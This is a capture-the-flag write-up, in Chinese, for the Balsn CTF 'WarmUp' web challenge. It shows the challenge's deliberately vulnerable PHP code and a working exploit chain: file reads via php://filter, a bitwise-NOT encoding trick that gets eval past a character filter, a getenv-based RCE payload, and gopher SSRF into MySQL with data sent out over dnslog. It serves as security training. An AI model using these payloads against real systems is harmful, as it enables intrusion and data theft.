[web] WarmUp
==================
```php
<?php
if (($secret = base64_decode(str_rot13("CTygMlOmpz" . "Z9VaSkYzcjMJpvCt==")))
    && highlight_file(__FILE__)
    && (include("config.php"))
    && ($op = @$_GET['op'])
    && (@strlen($op) < 3 && @($op + 8) < 'A_A')) {
    $_ = @$_GET['Σ>―(#°ω°#)♡→'];
    if (preg_match('/[\x00-!\'0-9"`&$.,|^[{_zdxfegavpos\x7F]+/i', $_)
        || @strlen(count_chars(strtolower($_), 3)) > 13
        || @strlen($_) > 19) {

        exit($secret);
    } else {
        $ch = curl_init();
        @curl_setopt(
            $ch,
            CURLOPT_URL,
            str_repLace(
                "int",
                ":DD",
                str_repLace(
                    "%69%6e%74",
                    "XDDD",
                    str_repLace(
                        "%2e%2e",
                        "Q___Q",
                        str_repLace(
                            "..",
                            "QAQ",
                            str_repLace(
                                "%33%33%61",
                                ">__<",
                                str_repLace(
                                    "%63%3a",
                                    "WTF",
                                    str_repLace(
                                        "633a",
                                        ":)",
                                        str_repLace(
                                            "433a",
                                            ":(",
                                            str_repLace(
                                                "\x63:",
                                                "ggininder",
                                                strtolower(eval("return $_;"))
                                            )
                                        )
                                    )
                                )
                            )
                        )
                    )
                )
            )
        );
        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        @curl_setopt($ch, CURLOPT_TIMEOUT, 1);
        @curl_EXEC($ch);
    }
} else if (@strlen($op) < 4 && @($op + 78) < 'A__A') {
    $_ = @$_GET['⁣'];
    //http://warmup.balsnctf.com/?%E2%81%A3=index.php%20&op=-79
    if ((strtolower(substr($_, -4)) === '.php')
                            || (strtolower(substr($_, -4)) === 'php.') 
                            || (stripos($_, "\"") !== FALSE) 
                            || (stripos($_, "\x3e") !== FALSE)
                            || (stripos($_, "\x3c") !== FALSE) 
                            || (stripos(strtolower($_), "amp") !== FALSE))
        die($secret);
    else {
        if (stripos($_, "..") !== false) {
            die($secret);
        } else {
            if (stripos($_, "\x24") !== false) {
                die($secret);
            } else {
                print_r(substr(@file_get_contents($_), 0, 155));
            }
        }
    }
} else {
    die($secret) && system($_GET[0x9487945]);
}
```

读取155个字节:http://warmup.balsnctf.com/?%E2%81%A3=config.php%20&op=-79
http://warmup.balsnctf.com/?⁣=php://filter/zlib.deflate/resource=config.php%20&op=-79
config.php

```php

<?php
    // ***********************************
    // THIS IS THE CONFIG OF THE MYSQL DB
    // ***********************************
    $host = "localhost";
    $user = "admin";
    $pass = "";
    $port = 8787;
    // hint:flag-is-in-the-database XDDDDDDD
    // ====================================
    
```



接着利用`(~xxxxxx)(~xxxxx)`来绕过字符限制来达到命令执行

```php
if(!preg_match('/[\x00-!\'0-9"`&$.,|^[{_zdxfegavpos\x7F]+/i',substr($_GET['i'],$i,1)))
    eval($_GET['i']);
```

此时用%28%7E%8F%97%8F%96%91%99%90%29%28%29来绕过执行phpinfo()

```php
$str='phpinfo';
$payload="(~".(~$str).")()";
#$payload="(~".~$str.")(~".(~"HTTP_X").")";
for($i=0;$i<strlen($payload);$i++)
    if(preg_match('/[\x00-!\'0-9"`&$.,|^[{_zdxfegavpos\x7F]+/i',substr($payload,$i,1)))
        print("failed");
    else print("success\n");
print(($payload."\n"));
```

接着就是用getenv来绕过长度限制

`payload:op=-9&%CE%A3%3E%E2%80%95(%23%C2%B0%CF%89%C2%B0%23)%E2%99%A1%E2%86%92=%28%7e%98%9a%8b%9a%91%89%29%28%7e%b7%ab%ab%af%a0%a7%29`

接着就是mysql未授权访问配合dnslog来外带数据

推荐ssrf payload生成器https://github.com/tarunkant/Gopherus



```
information_schema,test,thisisthedbname
fl4ggg
the_flag_col
Balsn{3z_w1nd0ws_php_ch4l}
```

